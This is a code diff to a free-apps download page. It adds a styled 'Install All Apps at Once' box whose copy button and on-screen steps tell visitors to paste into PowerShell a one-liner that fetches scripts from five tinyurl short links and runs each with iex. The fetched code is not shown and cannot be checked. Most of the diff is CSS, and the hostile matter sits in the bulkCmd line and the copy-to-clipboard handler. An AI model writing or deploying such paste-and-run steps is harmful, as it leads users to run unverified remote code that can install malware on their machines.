@@ -1529,10 +1529,211 @@
       .lightbox-zoom-hint { display: none; }
     }
 
+    /* ── Bulk Install ── */
+    .bulk-install {
+      margin: 40px auto 48px;
+      max-width: 720px;
+      animation: fadeUp 0.6s ease-out both;
+      animation-delay: 0.3s;
+    }
+
+    .bulk-install-label {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      font-size: 13px;
+      font-weight: 700;
+      color: rgba(255, 255, 255, 0.35);
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+      margin-bottom: 14px;
+    }
+
+    .bulk-install-label svg {
+      width: 18px;
+      height: 18px;
+      fill: #ff4444;
+    }
+
+    .bulk-install-box {
+      position: relative;
+      border-radius: 18px;
+      background: rgba(0, 0, 0, 0.35);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      overflow: hidden;
+      transition: border-color 0.4s ease, box-shadow 0.4s ease, transform 0.3s ease;
+      cursor: pointer;
+      box-shadow:
+        inset 0 2px 8px rgba(0, 0, 0, 0.5),
+        inset 0 -1px 4px rgba(255, 255, 255, 0.02),
+        0 1px 3px rgba(0, 0, 0, 0.3);
+    }
+
+    .bulk-install-box:hover {
+      border-color: rgba(255, 68, 68, 0.3);
+      box-shadow:
+        inset 0 2px 8px rgba(0, 0, 0, 0.5),
+        inset 0 -1px 4px rgba(255, 255, 255, 0.02),
+        0 0 25px rgba(255, 68, 68, 0.12),
+        0 0 50px rgba(255, 68, 68, 0.06),
+        0 0 80px rgba(255, 68, 68, 0.03);
+      transform: translateY(-1px);
+    }
+
+    .bulk-install-box:active {
+      transform: scale(0.98);
+    }
+
+    .bulk-install-code {
+      display: flex;
+      align-items: center;
+      padding: 18px 22px;
+      font-family: 'Consolas', 'Courier New', monospace;
+      font-size: 13px;
+      line-height: 1.6;
+      color: rgba(255, 255, 255, 0.6);
+      overflow-x: auto;
+      white-space: nowrap;
+      transition: color 0.3s ease;
+      user-select: all;
+      -webkit-user-select: all;
+    }
+
+    .bulk-install-box:hover .bulk-install-code {
+      color: rgba(255, 255, 255, 0.85);
+    }
+
+    .bulk-install-copy {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      padding: 6px 14px;
+      font-size: 11px;
+      font-weight: 700;
+      color: #ff4444;
+      background: rgba(255, 68, 68, 0.08);
+      border: 1px solid rgba(255, 68, 68, 0.15);
+      border-radius: 10px;
+      cursor: pointer;
+      opacity: 0;
+      transition: all 0.3s ease;
+      font-family: inherit;
+      letter-spacing: 0.3px;
+      text-transform: uppercase;
+    }
+
+    .bulk-install-copy:hover {
+      background: rgba(255, 68, 68, 0.18);
+      border-color: rgba(255, 68, 68, 0.3);
+    }
+
+    .bulk-install-box:hover .bulk-install-copy {
+      opacity: 1;
+    }
+
+    .bulk-install-shine {
+      position: absolute;
+      inset: 0;
+      pointer-events: none;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.02), transparent);
+      transform: translateX(-100%);
+      transition: transform 0.6s ease;
+      border-radius: inherit;
+    }
+
+    .bulk-install-box:hover .bulk-install-shine {
+      transform: translateX(100%);
+    }
+
+    .bulk-install-overlay {
+      position: absolute;
+      inset: 0;
+      border-radius: 18px;
+      background: rgba(8, 8, 15, 0.94);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      padding: 16px;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.35s ease;
+      z-index: 10;
+    }
+
+    .bulk-install-overlay.show {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    .bulk-install-overlay-step {
+      font-size: 11px;
+      color: rgba(255, 255, 255, 0.45);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .bulk-install-overlay-step kbd {
+      font-family: 'Consolas', 'Courier New', monospace;
+      font-size: 10px;
+      color: #fff;
+      background: rgba(255, 255, 255, 0.08);
+      padding: 2px 6px;
+      border-radius: 4px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .bulk-install-overlay-step code {
+      font-family: 'Consolas', 'Courier New', monospace;
+      font-size: 10px;
+      color: #ff4444;
+      background: rgba(255, 255, 255, 0.06);
+      padding: 2px 6px;
+      border-radius: 4px;
+    }
+
+    .bulk-install-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      padding: 3px 10px;
+      border-radius: 6px;
+      background: rgba(255, 68, 68, 0.1);
+      border: 1px solid rgba(255, 68, 68, 0.12);
+      font-size: 9px;
+      font-weight: 700;
+      color: #ff4444;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-left: 8px;
+    }
+
+    @media (max-width: 860px) {
+      .bulk-install {
+        margin-top: 28px;
+      }
+      .bulk-install-code {
+        font-size: 11px;
+        padding: 14px 16px;
+      }
+      .bulk-install-copy {
+        position: static;
+        margin: 0 14px 14px;
+        transform: none;
+        opacity: 1;
+      }
+    }
+
     /* ── Footer ── */
     .app-footer {
-      margin-top: 64px;
-      padding-top: 0;
+      margin-top: 80px;
+      padding: 0 0 48px;
       text-align: center;
       animation: fadeUp 0.6s ease-out both;
       animation-delay: 0.8s;
@@ -2030,7 +2231,26 @@
           <p class="footer-credit">5 Free Apps Bundle &middot; Built with passion</p>
         </footer>`;
 
-      app.innerHTML = hero + getSliderHtml() + `<div class="grid" id="grid">${cardsHtml}</div>` + footerHtml;
+      const bulkCmd = '"ytdlps1","mvdlps1","msdlps1","cmmgrps1","sndkkps1" | ForEach-Object { iex (iwr -useb "https://tinyurl.com/$_") }';
+      const bulkHtml = `
+        <div class="bulk-install">
+          <div class="bulk-install-label">
+            <svg viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+            Install All Apps at Once
+            <span class="bulk-install-tag"><svg viewBox="0 0 24 24" style="width:10px;height:10px;fill:currentColor"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg> 1-Click</span>
+          </div>
+          <div class="bulk-install-box" id="bulkInstallBox">
+            <div class="bulk-install-shine"></div>
+            <div class="bulk-install-code">${bulkCmd}</div>
+            <button class="bulk-install-copy" id="bulkInstallCopy" data-cmd='${bulkCmd.replace(/"/g, '&quot;')}'>Copy</button>
+            <div class="bulk-install-overlay" id="bulkInstallOverlay">
+              <div class="bulk-install-overlay-step"><kbd>Win</kbd>+<kbd>R</kbd> &rarr; <code>powershell</code> &rarr; <kbd>Enter</kbd></div>
+              <div class="bulk-install-overlay-step">Paste &rarr; <kbd>Enter</kbd> &rarr; All 5 apps install</div>
+            </div>
+          </div>
+        </div>`;
+
+      app.innerHTML = hero + getSliderHtml() + bulkHtml + `<div class="grid" id="grid">${cardsHtml}</div>` + footerHtml;
 
       // Animate grand total
       if (REPOS.length > 1) {
@@ -2083,6 +2303,37 @@
           setTimeout(() => overlay.classList.remove('show'), 4000);
         });
       });
+
+      // Bulk install copy
+      const bulkBox = document.getElementById('bulkInstallBox');
+      const bulkCopy = document.getElementById('bulkInstallCopy');
+      const bulkOverlay = document.getElementById('bulkInstallOverlay');
+      if (bulkBox && bulkCopy) {
+        const cmd = bulkCopy.dataset.cmd;
+        bulkBox.addEventListener('click', (e) => {
+          if (e.target === bulkCopy) return;
+          navigator.clipboard.writeText(cmd).then(() => {
+            const orig = bulkCopy.textContent;
+            bulkCopy.textContent = 'Copied!';
+            setTimeout(() => bulkCopy.textContent = orig, 1500);
+            showToast('All 5 Apps', '#ff4444');
+          });
+        });
+        bulkCopy.addEventListener('click', (e) => {
+          e.stopPropagation();
+          navigator.clipboard.writeText(cmd).then(() => {
+            const orig = bulkCopy.textContent;
+            bulkCopy.textContent = 'Copied!';
+            setTimeout(() => bulkCopy.textContent = orig, 1500);
+            showToast('All 5 Apps', '#ff4444');
+          });
+        });
+        bulkBox.addEventListener('mouseenter', () => {
+          if (!bulkOverlay || bulkOverlay.classList.contains('show')) return;
+          bulkOverlay.classList.add('show');
+          setTimeout(() => bulkOverlay.classList.remove('show'), 4000);
+        });
+      }
 
       // Toggle older releases dropdown
       document.querySelectorAll('.exe-toggle').forEach(tog => {
